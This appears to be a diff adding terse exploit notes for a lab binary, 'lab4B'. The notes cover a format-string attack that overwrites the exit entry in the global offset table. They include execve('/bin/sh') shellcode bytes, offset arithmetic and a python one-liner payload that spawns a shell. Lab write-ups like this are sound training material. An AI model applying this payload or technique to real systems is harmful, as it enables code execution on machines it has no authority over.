@@ -1,0 +1,23 @@
+global offset table
+$readelf --relocs ./lab4B
+080499b8  00000507 R_386_JUMP_SLOT   00000000   exit
+
+gdb-peda$ find "/bin/sh"
+libc : 0xb7f83a24 ("/bin/sh")
+
+# shellcode.s
+BITS 32
+xor    eax, eax
+mov    al, 0xb
+mov    ebx, 0xb7f83a24
+int    0x80
+
+$nasm shellcode.s
+$hexdump -C shellcode
+\x31\xc0\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80
+
+0xbffff67c - buff
+$calc 0xbfff - 0x8 = 49143
+$calc 0xf67c - 0xbfff = 13949
+
+$(python -c 'print("\xba\x99\x04\x08\xb8\x99\x04\x08" + "%49143x%6$hn%13949x%7$hn" + "\x90"*20 + "\x31\xc0\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80")'; cat;) | ./lab4B
